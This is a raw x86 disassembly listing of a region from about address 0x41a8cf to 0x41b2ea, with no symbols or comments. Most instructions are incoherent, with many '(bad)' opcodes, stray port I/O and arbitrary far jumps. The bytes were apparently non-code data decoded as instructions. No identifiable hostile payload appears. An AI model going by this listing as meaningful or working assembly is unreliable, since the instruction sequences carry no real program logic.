  41a8cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8d0:	sub    DWORD PTR [edi+0x5940b763],edi
  41a8d6:	add    esi,DWORD PTR ds:[ebp+0x9]
  41a8da:	jle    0x41a917
  41a8dc:	retf   0x91a3
  41a8df:	int    0x48
  41a8e1:	sub    eax,0x4600ce18
  41a8e6:	dec    esp
  41a8e7:	js     0x41a900
  41a8e9:	inc    eax
  41a8ea:	inc    ebx
  41a8eb:	cmp    bh,BYTE PTR [esi+0x37fc1272]
  41a8f1:	(bad)  
  41a8f2:	ror    BYTE PTR [esi*4+0x48c2e518],1
  41a8f9:	mov    ?,WORD PTR [edx+0x5a169fe0]
  41a8ff:	mov    bh,0x69
  41a901:	sbb    ch,BYTE PTR [eax+0x55]
  41a904:	mov    al,bh
  41a906:	inc    ecx
  41a907:	sub    BYTE PTR [ebx],ch
  41a909:	popf   
  41a90a:	sub    eax,0x76ea4593
  41a90f:	data16 jle 0x41a8d2
  41a912:	aas    
  41a913:	sbb    eax,0xffffffab
  41a916:	fst    DWORD PTR ds:0x4b830fe4
  41a91c:	or     al,0x32
  41a91e:	mov    ch,BYTE PTR [eax-0x3f]
  41a921:	and    DWORD PTR [edx+ecx*4],0xd43cfd2
  41a928:	push   cs
  41a929:	push   0x62
  41a92b:	mov    eax,eax
  41a92d:	mov    ecx,0xa68dbf0c
  41a932:	les    edi,FWORD PTR [edi-0x31]
  41a935:	pop    esi
  41a936:	adc    eax,0x2e2faf85
  41a93b:	jns    0x41a8fd
  41a93d:	repz int 0x67
  41a940:	sub    al,0x0
	...
  41a9b2:	add    BYTE PTR [eax],al
  41a9b4:	xor    esi,DWORD PTR [ecx]
  41a9b6:	xchg   ebx,eax
  41a9b7:	lds    edx,FWORD PTR [ebx-0x46088819]
  41a9bd:	icebp  
  41a9be:	cmp    eax,0x64f5169e
  41a9c3:	xchg   edx,eax
  41a9c4:	in     eax,dx
  41a9c5:	pop    ds
  41a9c6:	add    DWORD PTR [eax],eax
  41a9c8:	cmc    
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    BYTE PTR [esi+0x19e67b01],ah
  41a9d1:	test   eax,0xf07646bf
  41a9d6:	xchg   edi,eax
  41a9d7:	inc    eax
  41a9d8:	sub    DWORD PTR [edi],edx
  41a9da:	xchg   edx,eax
  41a9db:	out    dx,eax
  41a9dc:	xor    al,0x89
  41a9de:	cmc    
  41a9df:	inc    edi
  41a9e0:	push   cx
  41a9e2:	xchg   esi,eax
  41a9e3:	out    0x6f,eax
  41a9e5:	jle    0x41a971
  41a9e7:	and    ecx,DWORD PTR [ebx]
  41a9e9:	push   ebp
  41a9ea:	popf   
  41a9eb:	xchg   esp,eax
  41a9ec:	dec    edi
  41a9ed:	sbb    eax,0x9abd6ab1
  41a9f2:	add    dl,BYTE PTR [esi-0x58]
  41a9f5:	jg     0x41aa15
  41a9f7:	push   edx
  41a9f8:	in     al,0x85
  41a9fa:	mov    ds:0x8a07a665,al
  41a9ff:	out    dx,al
  41aa00:	and    esp,esp
  41aa02:	inc    edx
  41aa03:	xor    DWORD PTR [eax-0x55],0xffffff9b
  41aa07:	dec    BYTE PTR [esi]
  41aa09:	data16 mul BYTE PTR [ebp-0x71]
  41aa0d:	test   al,0x8d
  41aa0f:	rcr    BYTE PTR [ecx+0x18],cl
  41aa12:	out    0x7a,eax
  41aa14:	in     al,dx
  41aa15:	ds jbe 0x41aa8e
  41aa18:	and    eax,DWORD PTR [esp+edi*1]
  41aa1b:	nop
  41aa1c:	loop   0x41aa1f
  41aa1e:	push   es
  41aa1f:	sub    ebx,esi
  41aa21:	pop    esi
  41aa22:	std    
  41aa23:	retf   0xb030
  41aa26:	jne    0x41a9e7
  41aa28:	sub    dl,BYTE PTR [eax+0x3e]
  41aa2b:	not    esp
  41aa2d:	repnz xchg ebx,eax
  41aa2f:	mov    esi,0x5f52a74c
  41aa34:	xor    al,BYTE PTR [ebp-0x75a031c2]
  41aa3a:	sbb    BYTE PTR [esi-0x20],0xb4
  41aa3e:	out    dx,al
  41aa3f:	push   edx
  41aa40:	stos   BYTE PTR es:[edi],al
  41aa41:	xor    BYTE PTR [edi+0x41dd0e8b],bh
  41aa47:	adc    ebx,DWORD PTR [eax]
  41aa49:	push   0x29
  41aa4b:	in     al,0x55
  41aa4d:	sar    DWORD PTR [edx-0x2ce01e23],0x90
  41aa54:	ds xchg edx,eax
  41aa56:	mov    al,0x9d
  41aa58:	cmp    dl,BYTE PTR [edx-0x4]
  41aa5b:	fcmovnb st,st(5)
  41aa5d:	cmp    al,0xda
  41aa5f:	cmp    dl,BYTE PTR [esi]
  41aa61:	mov    ebx,DWORD PTR [eax-0x3d]
  41aa64:	outs   dx,BYTE PTR ds:[esi]
  41aa65:	push   edi
  41aa66:	div    ecx
  41aa68:	cmp    DWORD PTR [eax+esi*2],ebp
  41aa6b:	dec    ecx
  41aa6c:	add    DWORD PTR [esp+ecx*1],esp
  41aa6f:	pop    ebp
  41aa70:	xchg   ebp,eax
  41aa71:	mov    ch,0x5d
  41aa73:	scas   eax,DWORD PTR es:[edi]
  41aa74:	xor    BYTE PTR gs:0x33f8526c,dh
  41aa7b:	dec    eax
  41aa7c:	push   ebx
  41aa7d:	jecxz  0x41aab9
  41aa7f:	mov    eax,ebp
  41aa81:	iret   
  41aa82:	or     dh,ah
  41aa84:	(bad)  
  41aa85:	shl    BYTE PTR [eax-0x3b],cl
  41aa88:	pop    esi
  41aa89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa8a:	rol    BYTE PTR [ebx+0x1b19ed95],cl
  41aa90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa91:	int3   
  41aa92:	xchg   edx,eax
  41aa93:	(bad)  
  41aa95:	inc    ecx
  41aa96:	lea    edi,[ebp+0xfea20fb]
  41aa9c:	jo     0x41aaaf
  41aa9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa9f:	add    al,0x25
  41aaa1:	add    al,0xd6
  41aaa3:	inc    ecx
  41aaa4:	xchg   DWORD PTR [esi+edx*4],ecx
  41aaa7:	sub    BYTE PTR [ecx-0x2b],al
  41aaaa:	sbb    eax,0xb97b38c3
  41aaaf:	and    BYTE PTR [edx],ah
  41aab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aab2:	stos   BYTE PTR es:[edi],al
  41aab3:	shl    DWORD PTR [eax],1
  41aab5:	sbb    ch,BYTE PTR [edi-0x46]
  41aab8:	dec    ebp
  41aab9:	dec    esi
  41aaba:	ja     0x41aa99
  41aabc:	in     eax,0x51
  41aabe:	addr16 xchg ebp,eax
  41aac0:	pusha  
	...
  41ab31:	add    BYTE PTR [eax],al
  41ab33:	add    BYTE PTR [edx-0x3c],cl
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi+0x2]
  41ab41:	pop    esi
  41ab42:	pop    eax
  41ab43:	iret   
  41ab44:	loop   0x41ab66
  41ab46:	add    DWORD PTR [eax],eax
  41ab48:	cmc    
  41ab49:	add    BYTE PTR [eax],al
  41ab4b:	add    ah,bh
  41ab4d:	repnz and eax,0x339d7027
  41ab53:	mov    dh,0x46
  41ab55:	aas    
  41ab56:	sbb    DWORD PTR [edx-0x7c],ecx
  41ab59:	pushf  
  41ab5a:	push   esp
  41ab5b:	xchg   edi,eax
  41ab5c:	push   ss
  41ab5d:	or     dl,al
  41ab5f:	pop    es
  41ab60:	and    BYTE PTR [edi],dl
  41ab62:	es rcr cl,cl
  41ab65:	shl    DWORD PTR [eax+0x56],1
  41ab68:	add    al,BYTE PTR [edi-0x6d21a951]
  41ab6e:	push   edi
  41ab6f:	adc    esp,esp
  41ab71:	mov    bl,0xce
  41ab73:	push   ebx
  41ab74:	push   ds
  41ab75:	xor    esi,ebx
  41ab77:	lahf   
  41ab78:	pushf  
  41ab79:	pusha  
  41ab7a:	pop    ebx
  41ab7b:	lea    ecx,[edi]
  41ab7d:	icebp  
  41ab7e:	stos   BYTE PTR es:[edi],al
  41ab7f:	outs   dx,DWORD PTR ds:[esi]
  41ab80:	xchg   esp,eax
  41ab81:	imul   esi,DWORD PTR [ecx],0xfffffffa
  41ab84:	mov    al,0x49
  41ab86:	xor    BYTE PTR [ecx],0x63
  41ab89:	into   
  41ab8a:	or     bl,BYTE PTR [edx+0x6b]
  41ab8d:	dec    esp
  41ab8e:	cwde   
  41ab8f:	and    BYTE PTR [ebx+0x39129c0a],ch
  41ab95:	xor    eax,0xb8edbe3f
  41ab9a:	jae    0x41abc6
  41ab9c:	pop    eax
  41ab9d:	mov    edx,edx
  41ab9f:	inc    ecx
  41aba0:	mov    dh,BYTE PTR [esi+0x6e]
  41aba3:	push   ebx
  41aba4:	or     esp,ebp
  41aba6:	sbb    eax,DWORD PTR [ebp-0x3c]
  41aba9:	test   BYTE PTR [edi-0x3a],0xf6
  41abad:	pop    ebp
  41abae:	mov    al,ds:0x565e11c7
  41abb3:	adc    bl,BYTE PTR [ebp+0x10354f5e]
  41abb9:	je     0x41abc5
  41abbb:	adc    eax,0xc8a3ac90
  41abc0:	les    esp,FWORD PTR [ebp+0x644ecd14]
  41abc6:	add    esp,DWORD PTR [ecx-0x2]
  41abc9:	or     ebp,DWORD PTR [eax+eax*1+0x2f00dfb5]
  41abd0:	push   edi
  41abd1:	xchg   BYTE PTR [esi-0x5b93b797],ch
  41abd7:	or     bl,ch
  41abd9:	jl     0x41aba6
  41abdb:	xchg   ebp,eax
  41abdc:	or     edi,edx
  41abde:	mov    ah,0x28
  41abe0:	mov    al,BYTE PTR [esi+0x562e5ec7]
  41abe6:	mov    cl,0x49
  41abe8:	mov    ecx,0x869a7597
  41abed:	or     esi,DWORD PTR [eax+0x11b0e450]
  41abf3:	popf   
  41abf4:	ja     0x41ac01
  41abf6:	call   0xeeae:0xc53e289b
  41abfd:	cmc    
  41abfe:	dec    esp
  41abff:	out    dx,eax
  41ac00:	bound  edi,QWORD PTR [esi+0xd23640b]
  41ac06:	xor    DWORD PTR [edi+0x2c],esp
  41ac09:	sub    ebp,esi
  41ac0b:	or     BYTE PTR [eax+eiz*2-0x1b],cl
  41ac0f:	js     0x41ac21
  41ac11:	jp     0x41abc9
  41ac13:	jae    0x41ac83
  41ac15:	call   0x362b:0x171550b8
  41ac1c:	popf   
  41ac1d:	inc    ebp
  41ac1e:	sbb    al,BYTE PTR [esi]
  41ac20:	mov    ah,al
  41ac22:	and    eax,0x4f66a9a4
  41ac27:	lods   eax,DWORD PTR ds:[esi]
  41ac28:	add    eax,0xf4e47ff5
  41ac2d:	adc    al,ch
  41ac2f:	add    bh,dl
  41ac31:	mov    bh,0x73
  41ac33:	push   ss
  41ac34:	idiv   DWORD PTR [ecx+edi*4-0x4530e15f]
  41ac3b:	popa   
  41ac3c:	push   cs
  41ac3d:	das    
  41ac3e:	sbb    BYTE PTR [esi],0xb7
	...
  41acb1:	add    BYTE PTR [eax],al
  41acb3:	add    al,dh
  41acb5:	xchg   edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0xb6233a02
  41acc3:	inc    edi
  41acc4:	xlat   BYTE PTR ds:[ebx]
  41acc5:	and    DWORD PTR [ecx],eax
  41acc7:	add    ch,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    dl,ch
  41accd:	int3   
  41acce:	in     eax,dx
  41accf:	(bad)  
  41acd0:	push   esp
  41acd1:	push   esp
  41acd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acd3:	inc    eax
  41acd4:	pop    es
  41acd5:	loope  0x41ac79
  41acd7:	shl    BYTE PTR [esp+esi*8],0x6b
  41acdb:	jg     0x41ac9e
  41acdd:	sbb    edi,edx
  41acdf:	inc    ebx
  41ace0:	cld    
  41ace1:	add    eax,DWORD PTR [edx]
  41ace3:	xor    al,BYTE PTR [edx+0x7e]
  41ace6:	cmp    al,0xb4
  41ace8:	ss ds or al,0x47
  41acec:	lods   eax,DWORD PTR ds:[esi]
  41aced:	or     al,0x3d
  41acef:	icebp  
  41acf0:	sub    edi,DWORD PTR [edx-0x28]
  41acf3:	adc    eax,0xda7e6162
  41acf8:	pushf  
  41acf9:	out    dx,eax
  41acfa:	xchg   esp,eax
  41acfb:	jp     0x41ad42
  41acfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acfe:	faddp  st(4),st
  41ad00:	sbb    edi,0x7a
  41ad03:	arpl   di,si
  41ad05:	(bad)  
  41ad06:	and    BYTE PTR [edi+0x6bac5c45],dh
  41ad0c:	into   
  41ad0d:	sar    DWORD PTR ds:0xe382824a,cl
  41ad13:	loopne 0x41ad8d
  41ad15:	dec    ebx
  41ad16:	add    dh,BYTE PTR [ecx]
  41ad18:	mov    WORD PTR [edx+0x28],ds
  41ad1b:	shr    edi,0xa0
  41ad1e:	ja     0x41acb2
  41ad20:	dec    ecx
  41ad21:	mov    edi,0xa4c43404
  41ad26:	ins    BYTE PTR es:[edi],dx
  41ad27:	mov    cl,0xb4
  41ad29:	es adc al,dh
  41ad2c:	test   eax,0xd9e3119f
  41ad31:	imul   edi,DWORD PTR [eax+eax*2-0x76],0x7865498c
  41ad39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad3a:	test   al,0x9f
  41ad3c:	mov    BYTE PTR ds:0xa360eebf,cl
  41ad42:	sbb    al,0x4f
  41ad44:	popf   
  41ad45:	mov    cl,0xda
  41ad47:	fld    DWORD PTR [esi+0x31d2f412]
  41ad4d:	js     0x41adba
  41ad4f:	(bad)  
  41ad50:	hlt    
  41ad51:	xchg   BYTE PTR [esi+edi*4-0x62],dl
  41ad55:	daa    
  41ad56:	pushf  
  41ad57:	push   0xffffffce
  41ad59:	cli    
  41ad5a:	cld    
  41ad5b:	pcmpgtw mm2,QWORD PTR [edx-0x3c]
  41ad5f:	retf   
  41ad60:	push   edx
  41ad61:	(bad)  
  41ad62:	pop    ss
  41ad63:	dec    esi
  41ad64:	xchg   esi,eax
  41ad65:	repnz fisubr DWORD PTR [eax+eiz*2+0x6b]
  41ad6a:	pop    edx
  41ad6b:	ficomp WORD PTR [esi-0x28]
  41ad6e:	pop    es
  41ad6f:	dec    ebp
  41ad70:	xor    ah,dl
  41ad72:	pop    esi
  41ad73:	adc    al,0x2b
  41ad75:	cmp    al,0xee
  41ad77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad78:	lock fdivp st(4),st
  41ad7b:	xor    al,0x6c
  41ad7d:	sub    edx,DWORD PTR [ebx]
  41ad7f:	mov    ebp,0x4ed81cca
  41ad84:	pop    ds
  41ad85:	add    bh,BYTE PTR [ebx+0x50]
  41ad88:	dec    edx
  41ad89:	dec    esp
  41ad8a:	gs mov ebp,0x4e451eba
  41ad90:	in     al,0xc4
  41ad92:	mov    es,eax
  41ad94:	sub    al,BYTE PTR [edi]
  41ad96:	repnz push edi
  41ad98:	jmp    0x1f07cf4b
  41ad9d:	push   edi
  41ad9e:	sar    ah,1
  41ada0:	out    dx,al
  41ada1:	lods   eax,DWORD PTR ds:[esi]
  41ada2:	jns    0x41ad74
  41ada4:	fld    QWORD PTR [edi+0x46]
  41ada7:	cmp    DWORD PTR [esi],eax
  41ada9:	sub    BYTE PTR [edx],ah
  41adab:	lods   al,BYTE PTR ds:[esi]
  41adac:	or     DWORD PTR [edx+0x13],ecx
  41adaf:	mov    esp,0xe58eba3b
  41adb4:	or     ch,BYTE PTR [edx+0x5a2e9cc5]
  41adba:	and    edi,DWORD PTR [edx-0x4f8d09ea]
  41adc0:	add    BYTE PTR [eax],0x0
	...
  41ae33:	add    BYTE PTR [edi+0x5fc517d8],al
  41ae39:	iret   
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi-0x2f888be3]
  41ae41:	imul   edi,ebp,0x122ccd3
  41ae47:	add    ch,dh
  41ae49:	add    BYTE PTR [eax],al
  41ae4b:	add    BYTE PTR [esi],dh
  41ae4d:	in     al,0x48
  41ae4f:	xor    eax,0xa97a3f3b
  41ae54:	scas   al,BYTE PTR es:[edi]
  41ae55:	out    dx,al
  41ae56:	es add eax,0xf94c5a86
  41ae5c:	or     esp,DWORD PTR [eax-0xef3a157]
  41ae62:	aam    0xa1
  41ae64:	(bad)  
  41ae65:	xor    DWORD PTR [eax-0x5913c318],ebp
  41ae6b:	repz fsubr QWORD PTR [ebp+0x5f]
  41ae6f:	lds    eax,FWORD PTR [ecx]
  41ae71:	aad    0xa6
  41ae73:	test   bl,ch
  41ae75:	stc    
  41ae76:	outs   dx,DWORD PTR ds:[esi]
  41ae77:	jle    0x41ae7a
  41ae79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae7a:	push   es
  41ae7b:	jo     0x41ae2c
  41ae7d:	dec    eax
  41ae7e:	loopne 0x41aeef
  41ae80:	cmpxchg BYTE PTR [ecx+0x73],ch
  41ae84:	push   esp
  41ae85:	mov    ecx,DWORD PTR [eax+eiz*1-0x5edf4a31]
  41ae8c:	mov    ds:0xdd8632e0,eax
  41ae91:	mov    WORD PTR [edx+0x5c1469cd],ds
  41ae97:	ret    0x9e00
  41ae9a:	push   ss
  41ae9b:	push   0x47
  41ae9d:	jp     0x41af0b
  41ae9f:	xor    BYTE PTR gs:[eax],al
  41aea2:	add    eax,0x32b1dc6f
  41aea7:	xchg   BYTE PTR ds:0x7558eded,bh
  41aead:	sbb    DWORD PTR ds:0xcf38dc8e,eax
  41aeb3:	test   dh,0x77
  41aeb6:	xor    DWORD PTR [esi],edi
  41aeb8:	scas   eax,DWORD PTR es:[edi]
  41aeb9:	mov    edi,0x1218400
  41aebe:	dec    ebp
  41aebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aec0:	arpl   WORD PTR [edx+0x608a0e0a],si
  41aec6:	jmp    0x41af1a
  41aec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec9:	test   al,0xff
  41aecb:	ins    DWORD PTR es:[edi],dx
  41aecc:	(bad)  
  41aecd:	push   0x6738455e
  41aed2:	dec    edi
  41aed3:	adc    al,0x7f
  41aed5:	fidiv  DWORD PTR [edx]
  41aed7:	ja     0x41ae6e
  41aed9:	fsub   DWORD PTR ds:0xe48a21e0
  41aedf:	pop    ebx
  41aee0:	sub    DWORD PTR [ecx],eax
  41aee2:	dec    DWORD PTR [bp+si+0xc]
  41aee6:	sbb    dl,BYTE PTR [ebx-0x5f0143a3]
  41aeec:	test   eax,0x34b84b3e
  41aef1:	lods   eax,DWORD PTR ds:[esi]
  41aef2:	mov    bh,0x56
  41aef4:	mov    edx,0x99be7f4d
  41aef9:	xchg   DWORD PTR [edx],edx
  41aefb:	bound  edi,QWORD PTR [eax]
  41aefd:	rol    DWORD PTR [ebx],cl
  41aeff:	sar    bh,0x0
  41af02:	stc    
  41af03:	mov    ds:0x2ccb60ba,al
  41af09:	push   esp
  41af0a:	sbb    eax,0xd4c0ea46
  41af0f:	(bad)  
  41af10:	stos   DWORD PTR es:[edi],eax
  41af11:	enter  0x812c,0xa6
  41af15:	push   cs
  41af16:	jmp    0xabce:0x65a34aa4
  41af1d:	jg     0x41af7e
  41af1f:	lods   al,BYTE PTR ds:[esi]
  41af20:	add    bl,BYTE PTR ds:[ebp-0x4b5e0be]
  41af27:	sub    ebp,esi
  41af29:	or     bh,al
  41af2b:	push   0xe4603b21
  41af30:	inc    edi
  41af31:	pop    esi
  41af32:	mov    dl,0xfc
  41af34:	xchg   BYTE PTR [edi-0x329ec0],ch
  41af3a:	ja     0x41af8b
  41af3c:	pop    esp
  41af3d:	lock fisttp DWORD PTR [ebx+0x77]
	...
  41afb4:	dec    esi
  41afb5:	jmp    0x41afe1
  41afb7:	dec    esi
  41afb8:	scas   eax,DWORD PTR es:[edi]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x39
  41afc1:	push   ebp
  41afc2:	scas   al,BYTE PTR es:[edi]
  41afc3:	push   ebx
  41afc4:	shl    DWORD PTR [ebx],0x1
  41afc7:	add    ch,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [edx+0x2c],ah
  41afce:	push   edi
  41afcf:	mov    esp,0x5bd9e72
  41afd4:	adc    edi,DWORD PTR [ecx+0x460b200f]
  41afda:	mov    ebp,0x656d7489
  41afdf:	xchg   DWORD PTR [ebx],edi
  41afe1:	jl     0x41af75
  41afe3:	xchg   ecx,eax
  41afe4:	dec    ecx
  41afe5:	mov    ecx,0x725d2c0f
  41afea:	into   
  41afeb:	lahf   
  41afec:	inc    edx
  41afed:	bound  eax,QWORD PTR [edi]
  41afef:	loop   0x41afcd
  41aff1:	adc    cl,ch
  41aff3:	mov    ?,ebp
  41aff5:	int3   
  41aff6:	push   cs
  41aff7:	xchg   edx,edx
  41aff9:	sbb    cl,BYTE PTR [ebx]
  41affb:	push   ebx
  41affc:	inc    esi
  41affd:	lock int3 
  41afff:	outs   dx,DWORD PTR ds:[esi]
  41b000:	scas   al,BYTE PTR es:[edi]
  41b001:	scas   al,BYTE PTR es:[edi]
  41b002:	dec    esi
  41b003:	test   DWORD PTR [ebx+0x1b],edi
  41b006:	pop    ebp
  41b007:	(bad)  
  41b008:	cli    
  41b009:	jecxz  0x41afad
  41b00b:	div    DWORD PTR [edi]
  41b00d:	push   0x3c
  41b00f:	jns    0x41b01b
  41b011:	lock pop edi
  41b013:	outs   dx,BYTE PTR ds:[esi]
  41b015:	add    al,0x8b
  41b017:	gs inc esp
  41b019:	jecxz  0x41b055
  41b01b:	gs inc ecx
  41b01d:	xchg   BYTE PTR [esi+ebx*2+0x4d],al
  41b021:	inc    edx
  41b022:	and    ch,ch
  41b024:	mov    ebx,0x99fe15b
  41b029:	or     bl,BYTE PTR [ebx+0x43]
  41b02c:	(bad)  
  41b02d:	cmp    ebp,DWORD PTR [ebp+0x63917d67]
  41b033:	hlt    
  41b034:	push   ebx
  41b035:	dec    ebp
  41b036:	sub    esi,DWORD PTR [eax]
  41b038:	inc    edi
  41b039:	nop
  41b03a:	mov    ebp,0x47d3d90a
  41b03f:	mov    bh,0x1c
  41b041:	(bad)  
  41b042:	mov    ebp,0x77688f92
  41b047:	out    0xb2,eax
  41b049:	nop
  41b04a:	jns    0x41aff4
  41b04c:	cmp    BYTE PTR [eax+0x373ed2ba],bh
  41b052:	mov    WORD PTR [ebx],es
  41b054:	sti    
  41b055:	ret    0x9035
  41b058:	test   al,0x9f
  41b05a:	cli    
  41b05b:	adc    ch,dl
  41b05d:	je     0x41b0a2
  41b05f:	mov    al,0x55
  41b061:	sbb    BYTE PTR [edi-0x1d],ch
  41b064:	xor    al,0x97
  41b066:	push   cs
  41b067:	dec    eax
  41b068:	loop   0x41b0e5
  41b06a:	cs retf 0xbc32
  41b06e:	inc    esp
  41b06f:	imul   ebx,DWORD PTR [ebx-0x13a11c1b],0x25905db8
  41b079:	std    
  41b07a:	ds cmp al,0x39
  41b07d:	test   eax,0x30617efd
  41b082:	arpl   bx,cx
  41b084:	fsub   st,st(7)
  41b086:	ins    DWORD PTR es:[edi],dx
  41b087:	mov    BYTE PTR [ebx],ch
  41b089:	(bad)  
  41b08a:	bound  ebp,QWORD PTR [eax]
  41b08c:	outs   dx,BYTE PTR ds:[esi]
  41b08d:	shl    BYTE PTR [eax],cl
  41b08f:	push   ds
  41b090:	jmp    ecx
  41b092:	pop    esi
  41b093:	push   edi
  41b094:	and    al,0xe4
  41b096:	push   0xe93fcadf
  41b09b:	mov    ebx,0x170e8f5d
  41b0a0:	std    
  41b0a1:	mov    dh,0xb3
  41b0a3:	dec    ebp
  41b0a4:	fidiv  DWORD PTR [edi-0x17]
  41b0a7:	popa   
  41b0a8:	cmp    ebp,0xffffff90
  41b0ab:	dec    esi
  41b0ac:	sub    eax,0x8910e755
  41b0b1:	sbb    eax,0xc5bb0706
  41b0b6:	shr    BYTE PTR [esi-0x39fe7fd4],1
  41b0bc:	sbb    cl,BYTE PTR [ebx+0x90c3ca]
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	mov    eax,ds:0xb619ab33
  41b145:	and    al,0x1
  41b147:	add    ch,dh
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    BYTE PTR [ebp+0xd],ch
  41b14e:	loopne 0x41b19f
  41b150:	iret   
  41b151:	shl    DWORD PTR [ebx],1
  41b153:	test   eax,0xe89bf5a7
  41b158:	leave  
  41b159:	mov    DWORD PTR [ecx+0x72e15a0a],ebp
  41b15f:	mov    edx,0x89af3ae7
  41b164:	push   ebx
  41b165:	or     esi,esi
  41b167:	or     al,BYTE PTR [edi]
  41b169:	iret   
  41b16a:	xor    eax,esi
  41b16c:	cmp    al,0x27
  41b16e:	xchg   edi,eax
  41b16f:	test   al,0x21
  41b171:	shl    BYTE PTR [eax],cl
  41b173:	xor    eax,DWORD PTR [ecx+eax*4+0x31b863da]
  41b17a:	jmp    0x8198487d
  41b17f:	dec    edx
  41b180:	pop    ds
  41b181:	mov    ds:0x43bf7757,al
  41b186:	inc    esi
  41b187:	fisubr DWORD PTR [ebx-0x1849bded]
  41b18d:	jne    0x41b1b5
  41b18f:	sar    DWORD PTR [edi+0x3826c0b7],0x1a
  41b196:	or     ch,cl
  41b198:	xchg   edx,eax
  41b199:	out    dx,al
  41b19a:	fdiv   QWORD PTR [edi+0x54b365d3]
  41b1a0:	rol    edx,cl
  41b1a2:	push   cs
  41b1a3:	add    al,0x29
  41b1a5:	push   0xfae0244d
  41b1aa:	mov    WORD PTR [esi+ebp*4],gs
  41b1ad:	mov    ah,BYTE PTR ds:0x7f583a7a
  41b1b3:	jmp    0x1b43cd5e
  41b1b8:	sti    
  41b1b9:	scas   eax,DWORD PTR es:[edi]
  41b1ba:	loop   0x41b1cf
  41b1bc:	cmp    al,0xbb
  41b1be:	fdivp  st(1),st
  41b1c0:	(bad)  
  41b1c2:	cld    
  41b1c3:	inc    ecx
  41b1c4:	cmp    dl,cl
  41b1c6:	call   0x76be618d
  41b1cb:	sahf   
  41b1cc:	sub    ebx,ecx
  41b1ce:	arpl   WORD PTR [ecx+edi*1-0x4c],di
  41b1d2:	adc    al,0x19
  41b1d5:	ror    BYTE PTR [edi+0x7c2bef73],0xb8
  41b1dc:	outs   dx,BYTE PTR ds:[esi]
  41b1dd:	push   es
  41b1de:	dec    ecx
  41b1df:	loopne 0x41b18f
  41b1e1:	daa    
  41b1e2:	sub    BYTE PTR [eax-0x68ea62ff],dl
  41b1e8:	mov    eax,0x6efc02d2
  41b1ed:	lods   al,BYTE PTR ds:[esi]
  41b1ee:	push   es
  41b1ef:	add    esp,DWORD PTR [edi+0x5d]
  41b1f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1f3:	xchg   DWORD PTR [edi+0x7a],eax
  41b1f6:	out    dx,al
  41b1f7:	fadd   st,st(7)
  41b1f9:	sub    ebp,DWORD PTR [eax+0x2e7f0d04]
  41b1ff:	out    dx,al
  41b200:	dec    edx
  41b201:	mov    bh,0x77
  41b203:	std    
  41b204:	or     ah,bl
  41b206:	mov    ch,0x5
  41b208:	imul   ebp,DWORD PTR [eax],0x6ad346a1
  41b20e:	jmp    0x41b211
  41b210:	aad    0x3c
  41b212:	pushf  
  41b213:	retf   0x600e
  41b216:	inc    BYTE PTR [ecx-0x5aaca539]
  41b21c:	mov    DWORD PTR [ecx-0x31],esp
  41b21f:	add    al,0xaa
  41b221:	push   ds
  41b222:	jmp    0x41b26d
  41b224:	enter  0x845a,0x7
  41b228:	fdivrp st(0),st
  41b22a:	pop    edx
  41b22b:	pop    ebx
  41b22c:	jg     0x41b253
  41b22e:	jg     0x41b26f
  41b230:	inc    edi
  41b231:	add    esp,DWORD PTR [esi+0x4a]
  41b234:	pop    ss
  41b235:	add    DWORD PTR [ecx+0x1b],ebx
  41b238:	sbb    esp,ebp
  41b23a:	xor    dl,dl
  41b23c:	out    dx,eax
  41b23d:	adc    al,0x19
  41b23f:	call   0x41b29d
	...
  41b2b4:	neg    DWORD PTR [eax-0x58]
  41b2b7:	adc    ebp,DWORD PTR [edi+0x3afcfff3]
  41b2bd:	out    dx,eax
  41b2be:	jl     0x41b2c7
  41b2c0:	pop    ebp
  41b2c1:	daa    
  41b2c2:	or     bh,BYTE PTR [ecx]
  41b2c4:	stos   DWORD PTR es:[edi],eax
  41b2c5:	and    eax,0xf50001
  41b2ca:	add    BYTE PTR [eax],al
  41b2cc:	leave  
  41b2cd:	pop    ecx
  41b2ce:	xchg   ebx,eax
  41b2cf:	inc    edx
  41b2d0:	sbb    DWORD PTR [ecx],ebp
  41b2d2:	stos   DWORD PTR es:[edi],eax
  41b2d3:	add    eax,edi
  41b2d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2d6:	and    BYTE PTR [ecx],dh
  41b2d8:	xchg   edx,eax
  41b2d9:	xchg   edi,eax
  41b2da:	pop    esp
  41b2db:	sub    eax,0x40b688a1
  41b2e0:	sbb    bl,ch
  41b2e2:	inc    edx
  41b2e3:	sti    
  41b2e4:	jnp    0x41b312
  41b2e6:	test   ah,ah
  41b2e8:	cmp    al,bh
  41b2ea:	add    DWORD PTR [ebx],0x36
